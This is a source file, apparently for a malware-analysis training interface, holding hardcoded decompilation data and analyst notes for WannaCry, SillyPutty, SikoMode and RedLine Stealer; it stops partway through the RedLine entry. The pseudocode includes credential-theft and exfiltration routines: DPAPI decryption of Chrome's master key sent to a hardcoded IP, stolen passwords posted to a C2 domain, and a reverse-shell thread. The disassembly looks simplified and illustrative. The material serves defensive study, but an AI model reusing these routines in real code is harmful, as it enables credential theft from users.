"use client";

import { useState, useMemo } from "react";
import { MALWARE_SAMPLES } from "@/data/samples";
import {
  Code,
  Binary,
  Cpu,
  Layers,
  Sparkles,
  GitBranch,
  Filter,
  CheckCircle2,
  AlertTriangle,
  RefreshCw,
  Eye,
  Sliders,
  ChevronRight,
  ShieldAlert,
  ArrowRight,
  Zap,
  Tag,
  Wand2,
  FileCode2,
  Layers3,
  HelpCircle,
  Copy,
  Check,
  SplitSquareVertical,
  Activity,
  TerminalSquare
} from "lucide-react";

interface AsmLine {
  id: number;
  address: string;
  bytes: string;
  mnemonic: string;
  operands: string;
  comment: string;
  isDeadCode?: boolean;
}

interface PCodeOp {
  id: number;
  address: string;
  opcode: string;
  output?: string;
  inputs: string[];
  explanation: string;
  isDeadCode?: boolean;
}

interface PseudocodeLine {
  id: number;
  text: string;
  correspondsToAsmIds: number[];
  correspondsToPCodeIds: number[];
  isDeadCode?: boolean;
}

interface SampleDecompilationData {
  sampleId: string;
  functionName: string;
  signature: string;
  returnType: string;
  asm: AsmLine[];
  pcode: PCodeOp[];
  pseudocode: PseudocodeLine[];
  pseudocodeDeflattened: PseudocodeLine[];
  aiAnalysis: {
    purpose: string;
    algorithmicLogic: string;
    evasionTechniques: string[];
    reversingTips: string;
    mitreTactics: string[];
  };
  variables: Array<{
    original: string;
    type: string;
    inferredType: string;
    suggestedName: string;
    stackOffset: string;
    description: string;
  }>;
}

const DECOMPILER_DATA: Record<string, SampleDecompilationData> = {
  "SAMPLE-001": { // WannaCry.exe
    sampleId: "SAMPLE-001",
    functionName: "CheckKillswitchAndExecute",
    signature: "BOOL __cdecl CheckKillswitchAndExecute(LPCSTR szUrl, LPCSTR szMutex)",
    returnType: "BOOL",
    asm: [
      { id: 1, address: "0x00408100", bytes: "55", mnemonic: "push", operands: "ebp", comment: "; Setup standard stack frame" },
      { id: 2, address: "0x00408101", bytes: "89 E5", mnemonic: "mov", operands: "ebp, esp", comment: "; ebp = esp" },
      { id: 3, address: "0x00408103", bytes: "83 EC 20", mnemonic: "sub", operands: "esp, 0x20", comment: "; Reserve 32 bytes on stack" },
      { id: 4, address: "0x00408106", bytes: "90", mnemonic: "nop", operands: "", comment: "; Anti-analysis junk padding", isDeadCode: true },
      { id: 5, address: "0x00408107", bytes: "8B 45 08", mnemonic: "mov", operands: "eax, [ebp+0x8]", comment: "; eax = szUrl ('http://www.iuqer...com')" },
      { id: 6, address: "0x0040810A", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; dwFlags = 0" },
      { id: 7, address: "0x0040810C", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; dwContext = 0" },
      { id: 8, address: "0x0040810E", bytes: "50", mnemonic: "push", operands: "eax", comment: "; lpszUrl" },
      { id: 9, address: "0x0040810F", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; hInternet = NULL" },
      { id: 10, address: "0x00408111", bytes: "E8 52 1A 00 00", mnemonic: "call", operands: "InternetOpenUrlA", comment: "; Query killswitch web endpoint" },
      { id: 11, address: "0x00408116", bytes: "89 45 FC", mnemonic: "mov", operands: "[ebp-0x4], eax", comment: "; local_4 = hUrl" },
      { id: 12, address: "0x00408119", bytes: "85 C0", mnemonic: "test", operands: "eax, eax", comment: "; Test if HTTP handle != NULL" },
      { id: 13, address: "0x0040811B", bytes: "74 0F", mnemonic: "jz", operands: "0x0040812C", comment: "; If NULL (domain unreachable), branch to Ransomware detonation" },
      { id: 14, address: "0x0040811D", bytes: "8B 4D FC", mnemonic: "mov", operands: "ecx, [ebp-0x4]", comment: "; ecx = hUrl" },
      { id: 15, address: "0x00408120", bytes: "51", mnemonic: "push", operands: "ecx", comment: "; hInternet handle" },
      { id: 16, address: "0x00408121", bytes: "E8 64 1A 00 00", mnemonic: "call", operands: "InternetCloseHandle", comment: "; Cleanup handle" },
      { id: 17, address: "0x00408126", bytes: "31 C0", mnemonic: "xor", operands: "eax, eax", comment: "; Return FALSE (Abort detonation)" },
      { id: 18, address: "0x00408128", bytes: "89 EC", mnemonic: "mov", operands: "esp, ebp", comment: "; Stack teardown" },
      { id: 19, address: "0x0040812A", bytes: "5D", mnemonic: "pop", operands: "ebp", comment: "; Restore EBP" },
      { id: 20, address: "0x0040812B", bytes: "C3", mnemonic: "ret", operands: "", comment: "; Return to caller" },
      { id: 21, address: "0x0040812C", bytes: "68 A0 94 40 00", mnemonic: "push", operands: "offset szMutex", comment: "; 'Global\\MsWinZonesCacheCounterMutexA'" },
      { id: 22, address: "0x00408131", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; bInitialOwner = FALSE" },
      { id: 23, address: "0x00408133", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; lpMutexAttributes = NULL" },
      { id: 24, address: "0x00408135", bytes: "E8 B2 1B 00 00", mnemonic: "call", operands: "CreateMutexA", comment: "; Check single infection mutex" },
      { id: 25, address: "0x0040813A", bytes: "E8 00 12 00 00", mnemonic: "call", operands: "StartEncryptionEngine", comment: "; Launch AES/RSA file encryption loops" },
      { id: 26, address: "0x0040813F", bytes: "B8 01 00 00 00", mnemonic: "mov", operands: "eax, 1", comment: "; Return TRUE (Infection executed)" },
      { id: 27, address: "0x00408144", bytes: "C9", mnemonic: "leave", operands: "", comment: "; High-level stack cleanup" },
      { id: 28, address: "0x00408145", bytes: "C3", mnemonic: "ret", operands: "", comment: "; Return" }
    ],
    pcode: [
      { id: 1, address: "0x00408100", opcode: "STORE", inputs: ["(ram, ESP - 4, 4)", "(register, EBP, 4)"], explanation: "Pushes 32-bit EBP onto stack memory" },
      { id: 2, address: "0x00408101", opcode: "COPY", output: "(register, EBP, 4)", inputs: ["(register, ESP, 4)"], explanation: "Copies current stack top into base pointer" },
      { id: 3, address: "0x00408103", opcode: "INT_SUB", output: "(register, ESP, 4)", inputs: ["(register, ESP, 4)", "(const, 0x20, 4)"], explanation: "Decrements ESP by 32 bytes for stack variables" },
      { id: 4, address: "0x00408106", opcode: "INT_ADD", output: "(unique, 0x10, 4)", inputs: ["(const, 0, 4)", "(const, 0, 4)"], explanation: "Opaque NOP operation (Dead Code eliminated)", isDeadCode: true },
      { id: 5, address: "0x00408107", opcode: "LOAD", output: "(unique, 0x20, 4)", inputs: ["(ram, EBP + 0x8, 4)"], explanation: "Loads 32-bit pointer szUrl from stack arg" },
      { id: 6, address: "0x00408111", opcode: "CALLOTHER", output: "(register, EAX, 4)", inputs: ["InternetOpenUrlA", "(unique, 0x20, 4)", "(const, 0, 4)"], explanation: "Invokes WININET imported API probe" },
      { id: 7, address: "0x00408116", opcode: "STORE", inputs: ["(ram, EBP - 0x4, 4)", "(register, EAX, 4)"], explanation: "Saves return handle into local_4 (hUrl)" },
      { id: 8, address: "0x00408119", opcode: "INT_EQUAL", output: "(unique, 0x30, 1)", inputs: ["(register, EAX, 4)", "(const, 0x0, 4)"], explanation: "Evaluates zero flag condition (hUrl == NULL)" },
      { id: 9, address: "0x0040811B", opcode: "CBRANCH", inputs: ["(ram, 0x0040812C, 4)", "(unique, 0x30, 1)"], explanation: "Conditional jump: branches to detonation if domain probe fails" },
      { id: 10, address: "0x00408121", opcode: "CALLOTHER", inputs: ["InternetCloseHandle", "(ram, EBP - 0x4, 4)"], explanation: "Closes active HTTP session handle" },
      { id: 11, address: "0x00408126", opcode: "COPY", output: "(register, EAX, 4)", inputs: ["(const, 0x0, 4)"], explanation: "Sets function return value to FALSE" },
      { id: 12, address: "0x0040812B", opcode: "RETURN", inputs: ["(register, EAX, 4)"], explanation: "Returns control to parent CRT harness" },
      { id: 13, address: "0x00408135", opcode: "CALLOTHER", output: "(register, EAX, 4)", inputs: ["CreateMutexA", "(const, 0, 4)", "(const, 0, 4)", "(ram, szMutex, 4)"], explanation: "Creates mutex to prevent duplicate infection" },
      { id: 14, address: "0x0040813A", opcode: "CALL", inputs: ["StartEncryptionEngine"], explanation: "Transfers execution to AES-128 cryptographic worker loop" },
      { id: 15, address: "0x0040813F", opcode: "COPY", output: "(register, EAX, 4)", inputs: ["(const, 0x1, 4)"], explanation: "Sets function return value to TRUE" },
      { id: 16, address: "0x00408145", opcode: "RETURN", inputs: ["(register, EAX, 4)"], explanation: "Returns TRUE to caller" }
    ],
    pseudocode: [
      { id: 1, text: "BOOL CheckKillswitchAndExecute(LPCSTR szUrl, LPCSTR szMutex) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2, 3] },
      { id: 2, text: "    HINTERNET hUrl = NULL;", correspondsToAsmIds: [3], correspondsToPCodeIds: [3] },
      { id: 3, text: "    HANDLE hMutex = NULL;", correspondsToAsmIds: [3], correspondsToPCodeIds: [3] },
      { id: 4, text: "    /* Junk anti-disassembly padding */", correspondsToAsmIds: [4], correspondsToPCodeIds: [4], isDeadCode: true },
      { id: 5, text: "    __asm { nop }", correspondsToAsmIds: [4], correspondsToPCodeIds: [4], isDeadCode: true },
      { id: 6, text: "    hUrl = InternetOpenUrlA(NULL, szUrl, NULL, 0, 0, 0);", correspondsToAsmIds: [5, 6, 7, 8, 9, 10, 11], correspondsToPCodeIds: [5, 6, 7] },
      { id: 7, text: "    if (hUrl != NULL) {", correspondsToAsmIds: [12, 13], correspondsToPCodeIds: [8, 9] },
      { id: 8, text: "        // Sinkhole / Live domain detected -> Neutralize payload", correspondsToAsmIds: [14, 15], correspondsToPCodeIds: [10] },
      { id: 9, text: "        InternetCloseHandle(hUrl);", correspondsToAsmIds: [14, 15, 16], correspondsToPCodeIds: [10] },
      { id: 10, text: "        return FALSE;", correspondsToAsmIds: [17, 18, 19, 20], correspondsToPCodeIds: [11, 12] },
      { id: 11, text: "    }", correspondsToAsmIds: [13], correspondsToPCodeIds: [9] },
      { id: 12, text: "    // Killswitch query failed: Proceed with infection", correspondsToAsmIds: [21, 22, 23], correspondsToPCodeIds: [13] },
      { id: 13, text: "    hMutex = CreateMutexA(NULL, FALSE, szMutex);", correspondsToAsmIds: [21, 22, 23, 24], correspondsToPCodeIds: [13] },
      { id: 14, text: "    StartEncryptionEngine();", correspondsToAsmIds: [25], correspondsToPCodeIds: [14] },
      { id: 15, text: "    return TRUE;", correspondsToAsmIds: [26, 27, 28], correspondsToPCodeIds: [15, 16] },
      { id: 16, text: "}", correspondsToAsmIds: [28], correspondsToPCodeIds: [16] }
    ],
    pseudocodeDeflattened: [
      { id: 1, text: "/* [DE-FLATTENED] Control Flow Dispatcher Normalized */", correspondsToAsmIds: [1, 2], correspondsToPCodeIds: [1, 2] },
      { id: 2, text: "BOOL CheckKillswitchAndExecute(LPCSTR szUrl, LPCSTR szMutex) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 3, text: "    HINTERNET hUrl = InternetOpenUrlA(NULL, szUrl, NULL, 0, 0, 0);", correspondsToAsmIds: [5, 6, 7, 8, 9, 10, 11], correspondsToPCodeIds: [5, 6, 7] },
      { id: 4, text: "    if (hUrl) {", correspondsToAsmIds: [12, 13], correspondsToPCodeIds: [8, 9] },
      { id: 5, text: "        InternetCloseHandle(hUrl);", correspondsToAsmIds: [14, 15, 16], correspondsToPCodeIds: [10] },
      { id: 6, text: "        return FALSE;", correspondsToAsmIds: [17, 18, 19, 20], correspondsToPCodeIds: [11, 12] },
      { id: 7, text: "    }", correspondsToAsmIds: [13], correspondsToPCodeIds: [9] },
      { id: 8, text: "    CreateMutexA(NULL, FALSE, szMutex);", correspondsToAsmIds: [21, 22, 23, 24], correspondsToPCodeIds: [13] },
      { id: 9, text: "    StartEncryptionEngine();", correspondsToAsmIds: [25], correspondsToPCodeIds: [14] },
      { id: 10, text: "    return TRUE;", correspondsToAsmIds: [26, 27, 28], correspondsToPCodeIds: [15, 16] },
      { id: 11, text: "}", correspondsToAsmIds: [28], correspondsToPCodeIds: [16] }
    ],
    aiAnalysis: {
      purpose: "Hardcoded Web Killswitch Check and Ransomware Detonation Gate",
      algorithmicLogic: "The subroutine attempts an HTTP GET connection to an unresolvable domain. If the domain responds (e.g., sinkholed by malware researchers), the malware immediately terminates execution without encrypting files. If the connection fails (normal uninfected network), it acquires an infection mutex and fires the multithreaded AES encryption pipeline.",
      evasionTechniques: [
        "Sinkhole-sensitive logic (inversion of normal C2 behavior)",
        "Global Named Mutex check to prevent self-collision",
        "Direct WinInet API resolution"
      ],
      reversingTips: "Patch the JZ instruction at 0x0040811B with NOPs or invert to JNZ (75 0F) to force the binary to treat every network state as a sinkhole hit, halting detonation permanently.",
      mitreTactics: ["TA0005: Defense Evasion", "TA0011: Command & Control", "TA0040: Impact"]
    },
    variables: [
      { original: "local_4", type: "undefined4", inferredType: "HINTERNET", suggestedName: "hKillswitchSocket", stackOffset: "[EBP - 0x04]", description: "Handle to remote HTTP request object" },
      { original: "szUrl", type: "char*", inferredType: "LPCSTR", suggestedName: "pKillswitchUrl", stackOffset: "[EBP + 0x08]", description: "Sinkhole domain URL pointer" },
      { original: "szMutex", type: "char*", inferredType: "LPCSTR", suggestedName: "pInfectionMutex", stackOffset: "[EBP + 0x0C]", description: "Global named mutex string" }
    ]
  },
  "SAMPLE-002": { // SillyPutty.exe
    sampleId: "SAMPLE-002",
    functionName: "SpawnTrojanThreadAndResume",
    signature: "DWORD __stdcall SpawnTrojanThreadAndResume(LPVOID lpParam)",
    returnType: "DWORD",
    asm: [
      { id: 1, address: "0x00412880", bytes: "55", mnemonic: "push", operands: "ebp", comment: "; Entry point hook in PuTTY main" },
      { id: 2, address: "0x00412881", bytes: "89 E5", mnemonic: "mov", operands: "ebp, esp", comment: "; Setup Frame" },
      { id: 3, address: "0x00412883", bytes: "83 EC 10", mnemonic: "sub", operands: "esp, 0x10", comment: "; Allocate stack space" },
      { id: 4, address: "0x00412886", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; lpThreadId = NULL" },
      { id: 5, address: "0x00412888", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; dwCreationFlags = 0 (EXECUTE)" },
      { id: 6, address: "0x0041288A", bytes: "68 40 29 41 00", mnemonic: "push", operands: "offset BackdoorWorker", comment: "; Pointer to PowerShell Reverse Shell Callback" },
      { id: 7, address: "0x0041288F", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; lpParameter = NULL" },
      { id: 8, address: "0x00412891", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; dwStackSize = 0" },
      { id: 9, address: "0x00412893", bytes: "6A 00", mnemonic: "push", operands: "0", comment: "; lpThreadAttributes = NULL" },
      { id: 10, address: "0x00412895", bytes: "E8 22 41 00 00", mnemonic: "call", operands: "CreateThread", comment: "; Spawn asynchronous backdoor thread" },
      { id: 11, address: "0x0041289A", bytes: "89 45 FC", mnemonic: "mov", operands: "[ebp-0x4], eax", comment: "; local_4 = hThread" },
      { id: 12, address: "0x0041289D", bytes: "E8 B0 77 00 00", mnemonic: "call", operands: "PuTTY_OriginalWinMain", comment: "; Jump to authentic PuTTY GUI entry" },
      { id: 13, address: "0x004128A2", bytes: "C9", mnemonic: "leave", operands: "", comment: "; Clean frame" },
      { id: 14, address: "0x004128A3", bytes: "C3", mnemonic: "ret", operands: "", comment: "; Exit" }
    ],
    pcode: [
      { id: 1, address: "0x00412880", opcode: "STORE", inputs: ["(ram, ESP - 4, 4)", "(register, EBP, 4)"], explanation: "Pushes EBP into stack memory" },
      { id: 2, address: "0x00412881", opcode: "COPY", output: "(register, EBP, 4)", inputs: ["(register, ESP, 4)"], explanation: "Copies ESP into EBP" },
      { id: 3, address: "0x00412895", opcode: "CALLOTHER", output: "(register, EAX, 4)", inputs: ["CreateThread", "(const, 0, 4)", "(ram, BackdoorWorker, 4)"], explanation: "Dispatches background worker thread" },
      { id: 4, address: "0x0041289A", opcode: "STORE", inputs: ["(ram, EBP - 0x4, 4)", "(register, EAX, 4)"], explanation: "Saves thread handle into local_4" },
      { id: 5, address: "0x0041289D", opcode: "CALL", inputs: ["PuTTY_OriginalWinMain"], explanation: "Calls authentic PuTTY GUI window loop" },
      { id: 6, address: "0x004128A3", opcode: "RETURN", inputs: ["(register, EAX, 4)"], explanation: "Returns WinMain exit code" }
    ],
    pseudocode: [
      { id: 1, text: "DWORD SpawnTrojanThreadAndResume(LPVOID lpParam) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 2, text: "    HANDLE hThread = NULL;", correspondsToAsmIds: [3], correspondsToPCodeIds: [2] },
      { id: 3, text: "    // Covert thread deployment in legitimate binary wrapper", correspondsToAsmIds: [4, 5, 6, 7, 8, 9], correspondsToPCodeIds: [3] },
      { id: 4, text: "    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BackdoorWorker, NULL, 0, NULL);", correspondsToAsmIds: [4, 5, 6, 7, 8, 9, 10, 11], correspondsToPCodeIds: [3, 4] },
      { id: 5, text: "    // Resume authentic user experience to evade suspicion", correspondsToAsmIds: [12], correspondsToPCodeIds: [5] },
      { id: 6, text: "    return PuTTY_OriginalWinMain();", correspondsToAsmIds: [12, 13, 14], correspondsToPCodeIds: [5, 6] },
      { id: 7, text: "}", correspondsToAsmIds: [14], correspondsToPCodeIds: [6] }
    ],
    pseudocodeDeflattened: [
      { id: 1, text: "/* [NORMALIZED] SillyPutty Entry Wrapper */", correspondsToAsmIds: [1, 2], correspondsToPCodeIds: [1, 2] },
      { id: 2, text: "DWORD SpawnTrojanThreadAndResume(LPVOID lpParam) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 3, text: "    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BackdoorWorker, NULL, 0, NULL);", correspondsToAsmIds: [4, 5, 6, 7, 8, 9, 10], correspondsToPCodeIds: [3] },
      { id: 4, text: "    return PuTTY_OriginalWinMain();", correspondsToAsmIds: [12, 13, 14], correspondsToPCodeIds: [5, 6] },
      { id: 5, text: "}", correspondsToAsmIds: [14], correspondsToPCodeIds: [6] }
    ],
    aiAnalysis: {
      purpose: "Trojanized Binary Wrapper & Asynchronous PowerShell Reverse Shell Injector",
      algorithmicLogic: "The binary modifies the standard PuTTY entry point to call CreateThread prior to rendering the SSH connection GUI. The spawned background thread compiles and runs a hidden PowerShell TCP reverse client targeting 192.168.195.139:4444, leaving the user unaware of malicious activity.",
      evasionTechniques: [
        "Trojanizing trusted open-source software (Masquerading)",
        "Thread decoupling to prevent GUI freeze",
        "Hidden process execution"
      ],
      reversingTips: "Follow the pointer at 0x0041288A (BackdoorWorker) in IDA/Ghidra to discover the XOR string decoding routine constructing the PowerShell command line.",
      mitreTactics: ["TA0002: Execution", "TA0005: Defense Evasion", "TA0011: Command & Control"]
    },
    variables: [
      { original: "local_4", type: "undefined4", inferredType: "HANDLE", suggestedName: "hBackdoorThread", stackOffset: "[EBP - 0x04]", description: "Worker thread handle for C2 loop" },
      { original: "lpParam", type: "void*", inferredType: "LPVOID", suggestedName: "pContextState", stackOffset: "[EBP + 0x08]", description: "Unused PuTTY startup parameter" }
    ]
  },
  "SAMPLE-003": { // SikoMode.exe
    sampleId: "SAMPLE-003",
    functionName: "RC4_KeyStreamAndExfiltrate",
    signature: "void __fastcall RC4_KeyStreamAndExfiltrate(const char* pKey, BYTE* pData, size_t nLen)",
    returnType: "void",
    asm: [
      { id: 1, address: "0x00421000", bytes: "55", mnemonic: "push", operands: "rbp", comment: "; SikoMode Nim KSA Routine" },
      { id: 2, address: "0x00421001", bytes: "48 89 E5", mnemonic: "mov", operands: "rbp, rsp", comment: "; Setup 64-bit frame" },
      { id: 3, address: "0x00421004", bytes: "48 81 EC 00 01 00 00", mnemonic: "sub", operands: "rsp, 0x100", comment: "; Allocate 256 bytes for S-Box (S[256])" },
      { id: 4, address: "0x0042100B", bytes: "31 C0", mnemonic: "xor", operands: "eax, eax", comment: "; i = 0" },
      { id: 5, address: "0x0042100D", bytes: "88 44 04 00", mnemonic: "mov", operands: "[rsp+rax], al", comment: "; S[i] = i (Initialize identity S-box)" },
      { id: 6, address: "0x00421011", bytes: "FF C0", mnemonic: "inc", operands: "eax", comment: "; i++" },
      { id: 7, address: "0x00421013", bytes: "3D 00 01 00 00", mnemonic: "cmp", operands: "eax, 256", comment: "; Loop until i == 256" },
      { id: 8, address: "0x00421018", bytes: "75 F3", mnemonic: "jne", operands: "0x0042100D", comment: "; S-Box initialization loop" },
      { id: 9, address: "0x0042101A", bytes: "E8 40 33 00 00", mnemonic: "call", operands: "RC4_PRGA_Encrypt", comment: "; Generate keystream XOR with stolen credentials" },
      { id: 10, address: "0x0042101F", bytes: "E8 90 44 00 00", mnemonic: "call", operands: "HttpSendRequestA", comment: "; Post cipher blob to update.kbfirewall.com" },
      { id: 11, address: "0x00421024", bytes: "48 81 C4 00 01 00 00", mnemonic: "add", operands: "rsp, 0x100", comment: "; Deallocate S-Box" },
      { id: 12, address: "0x0042102B", bytes: "5D", mnemonic: "pop", operands: "rbp", comment: "; Restore frame" },
      { id: 13, address: "0x0042102C", bytes: "C3", mnemonic: "ret", operands: "", comment: "; Return" }
    ],
    pcode: [
      { id: 1, address: "0x00421000", opcode: "STORE", inputs: ["(ram, RSP - 8, 8)", "(register, RBP, 8)"], explanation: "Saves 64-bit frame base" },
      { id: 2, address: "0x00421004", opcode: "INT_SUB", output: "(register, RSP, 8)", inputs: ["(register, RSP, 8)", "(const, 256, 8)"], explanation: "Reserves 256 bytes for RC4 permutation matrix" },
      { id: 3, address: "0x0042100D", opcode: "STORE", inputs: ["(ram, RSP + RAX, 1)", "(register, AL, 1)"], explanation: "Sets S-box entry S[i] = i" },
      { id: 4, address: "0x00421018", opcode: "CBRANCH", inputs: ["(ram, 0x0042100D, 8)", "(unique, 0x12, 1)"], explanation: "KSA initialization loop condition" },
      { id: 5, address: "0x0042101A", opcode: "CALL", inputs: ["RC4_PRGA_Encrypt"], explanation: "Generates keystream byte with key 'sikomode'" },
      { id: 6, address: "0x0042101F", opcode: "CALLOTHER", inputs: ["HttpSendRequestA", "(ram, update.kbfirewall.com, 8)"], explanation: "Transmits ciphertext over HTTP POST channel" },
      { id: 7, address: "0x0042102C", opcode: "RETURN", inputs: [], explanation: "Exits subroutine" }
    ],
    pseudocode: [
      { id: 1, text: "void RC4_KeyStreamAndExfiltrate(const char* pKey, BYTE* pData, size_t nLen) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 2, text: "    BYTE S[256];", correspondsToAsmIds: [3], correspondsToPCodeIds: [2] },
      { id: 3, text: "    // Key Scheduling Algorithm (KSA)", correspondsToAsmIds: [4, 5, 6, 7, 8], correspondsToPCodeIds: [3, 4] },
      { id: 4, text: "    for (int i = 0; i < 256; i++) {", correspondsToAsmIds: [4, 6, 7, 8], correspondsToPCodeIds: [3, 4] },
      { id: 5, text: "        S[i] = (BYTE)i;", correspondsToAsmIds: [5], correspondsToPCodeIds: [3] },
      { id: 6, text: "    }", correspondsToAsmIds: [8], correspondsToPCodeIds: [4] },
      { id: 7, text: "    RC4_PRGA_Encrypt(S, pKey, \"sikomode\", pData, nLen);", correspondsToAsmIds: [9], correspondsToPCodeIds: [5] },
      { id: 8, text: "    // Exfiltrate cipher stream to C2 node", correspondsToAsmIds: [10], correspondsToPCodeIds: [6] },
      { id: 9, text: "    HttpSendRequestA(hC2Endpoint, NULL, 0, pData, nLen);", correspondsToAsmIds: [10], correspondsToPCodeIds: [6] },
      { id: 10, text: "}", correspondsToAsmIds: [11, 12, 13], correspondsToPCodeIds: [7] }
    ],
    pseudocodeDeflattened: [
      { id: 1, text: "/* [DE-FLATTENED] Standard RC4 Stream Cipher Subroutine */", correspondsToAsmIds: [1, 2], correspondsToPCodeIds: [1, 2] },
      { id: 2, text: "void RC4_KeyStreamAndExfiltrate(const char* pKey, BYTE* pData, size_t nLen) {", correspondsToAsmIds: [1, 2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 3, text: "    BYTE S[256];", correspondsToAsmIds: [3], correspondsToPCodeIds: [2] },
      { id: 4, text: "    RC4_Init_KSA(S, \"sikomode\");", correspondsToAsmIds: [4, 5, 6, 7, 8], correspondsToPCodeIds: [3, 4] },
      { id: 5, text: "    RC4_PRGA_Encrypt(S, pData, nLen);", correspondsToAsmIds: [9], correspondsToPCodeIds: [5] },
      { id: 6, text: "    HttpSendRequestA(hC2Endpoint, NULL, 0, pData, nLen);", correspondsToAsmIds: [10], correspondsToPCodeIds: [6] },
      { id: 7, text: "}", correspondsToAsmIds: [11, 12, 13], correspondsToPCodeIds: [7] }
    ],
    aiAnalysis: {
      purpose: "RC4 Encryption Engine and C2 HTTP POST Exfiltration",
      algorithmicLogic: "Initializes a classic 256-byte S-box permutation array using the hardcoded key 'sikomode'. Encrypts harvested browser SQLite password caches in memory before pushing the payload via HTTP POST to update.kbfirewall.com.",
      evasionTechniques: [
        "Nim runtime wrapper concealing standard C standard library signatures",
        "Stream encryption bypassing network plaintext inspection"
      ],
      reversingTips: "Capture network PCAPs in Wireshark and run the payload through CyberChef RC4 decryptor with passphrase 'sikomode' to instantly extract all exfiltrated credentials in plaintext.",
      mitreTactics: ["TA0006: Credential Access", "TA0010: Exfiltration", "TA0011: Command & Control"]
    },
    variables: [
      { original: "local_100", type: "byte[256]", inferredType: "BYTE[256]", suggestedName: "rc4StateMatrix", stackOffset: "[RSP + 0x00]", description: "RC4 permutation table array" },
      { original: "pData", type: "char*", inferredType: "const char*", suggestedName: "pPasswordBuffer", stackOffset: "[RBP + 0x10]", description: "Extracted SQLite credential buffer" }
    ]
  },
  "SAMPLE-004": { // RedLineStealer.exe
    sampleId: "SAMPLE-004",
    functionName: "DecryptChromeMasterKeyAndHarvest",
    signature: "byte[] DecryptChromeMasterKeyAndHarvest(string localStatePath)",
    returnType: "byte[]",
    asm: [
      { id: 1, address: "IL_0000", bytes: "00", mnemonic: "nop", operands: "", comment: "; C# IL Decompilation Start" },
      { id: 2, address: "IL_0001", bytes: "72 2A 04 00 70", mnemonic: "ldstr", operands: "\"os_crypt.encrypted_key\"", comment: "; Load JSON key name" },
      { id: 3, address: "IL_0006", bytes: "28 5A 00 00 0A", mnemonic: "call", operands: "File::ReadAllText", comment: "; Read Chrome Local State JSON" },
      { id: 4, address: "IL_000B", bytes: "28 72 00 00 06", mnemonic: "call", operands: "Convert::FromBase64String", comment: "; Decode DPAPI key blob" },
      { id: 5, address: "IL_0010", bytes: "73 34 00 00 0A", mnemonic: "newobj", operands: "DPAPI::Unprotect", comment: "; Call CryptUnprotectData" },
      { id: 6, address: "IL_0015", bytes: "28 98 00 00 0A", mnemonic: "call", operands: "WCFClient::SendCredentials", comment: "; Net.Tcp exfiltration over port 18342" },
      { id: 7, address: "IL_001A", bytes: "2A", mnemonic: "ret", operands: "", comment: "; Return master key" }
    ],
    pcode: [
      { id: 1, address: "IL_0001", opcode: "COPY", output: "(unique, 0x10, 8)", inputs: ["(const, \"os_crypt\", 8)"], explanation: "Loads string constant into managed heap" },
      { id: 2, address: "IL_0006", opcode: "CALLOTHER", output: "(unique, 0x20, 8)", inputs: ["File.ReadAllText", "(unique, 0x10, 8)"], explanation: "Reads disk JSON content" },
      { id: 3, address: "IL_0010", opcode: "CALLOTHER", output: "(register, EAX, 8)", inputs: ["ProtectedData.Unprotect", "(unique, 0x20, 8)"], explanation: "Invokes DPAPI to decrypt Chrome Master Key" },
      { id: 4, address: "IL_0015", opcode: "CALLOTHER", inputs: ["WCFClient.SendCredentials", "(register, EAX, 8)"], explanation: "Sends stolen master key over Net.Tcp socket" },
      { id: 5, address: "IL_001A", opcode: "RETURN", inputs: ["(register, EAX, 8)"], explanation: "Returns byte array" }
    ],
    pseudocode: [
      { id: 1, text: "public static byte[] DecryptChromeMasterKeyAndHarvest(string localStatePath) {", correspondsToAsmIds: [1, 2], correspondsToPCodeIds: [1] },
      { id: 2, text: "    string json = File.ReadAllText(localStatePath);", correspondsToAsmIds: [2, 3], correspondsToPCodeIds: [1, 2] },
      { id: 3, text: "    string encryptedKeyB64 = JsonParser.Extract(json, \"os_crypt.encrypted_key\");", correspondsToAsmIds: [3, 4], correspondsToPCodeIds: [2] },
      { id: 4, text: "    byte[] dpapiCipher = Convert.FromBase64String(encryptedKeyB64).Skip(5).ToArray();", correspondsToAsmIds: [4], correspondsToPCodeIds: [2] },
      { id: 5, text: "    byte[] masterKey = ProtectedData.Unprotect(dpapiCipher, null, DataProtectionScope.CurrentUser);", correspondsToAsmIds: [5], correspondsToPCodeIds: [3] },
      { id: 6, text: "    WCFClient.SendCredentials(\"net.tcp://185.161.248.42:18342/Service\", masterKey);", correspondsToAsmIds: [6], correspondsToPCodeIds: [4] },
      { id: 7, text: "    return masterKey;", correspondsToAsmIds: [7], correspondsToPCodeIds: [5] },
      { id: 8, text: "}", correspondsToAsmIds: [7], correspondsToPCodeIds: [5] }
    ],
    pseudocodeDeflattened: [
      { id: 1, text: "/* [DE-CONFUSEREX] De-obfuscated .NET Master Key Decryptor */", correspondsToAsmIds: [1], correspondsToPCodeIds: [1] },
      { id: 2, text: "public static byte[] DecryptChromeMasterKeyAndHarvest(string localStatePath) {", correspondsToAsmIds: [1, 2], correspondsToPCodeIds: [1] },
      { id: 3, text: "    byte[] dpapiCipher = ExtractEncryptedKey(localStatePath);", correspondsToAsmIds: [2, 3, 4], correspondsToPCodeIds: [2] },
      { id: 4, text: "    byte[] masterKey = ProtectedData.Unprotect(dpapiCipher, null, DataProtectionScope.CurrentUser);", correspondsToAsmIds: [5], correspondsToPCodeIds: [3] },
      { id: 5, text: "    WCFClient.SendCredentials(\"net.tcp://185.161.248.42:18342/Service\", masterKey);", correspondsToAsmIds: [6], correspondsToPCodeIds: [4] },
      { id: 7, text: "    return masterKey;", correspondsToAsmIds: [7], correspondsToPCodeIds: [5] },
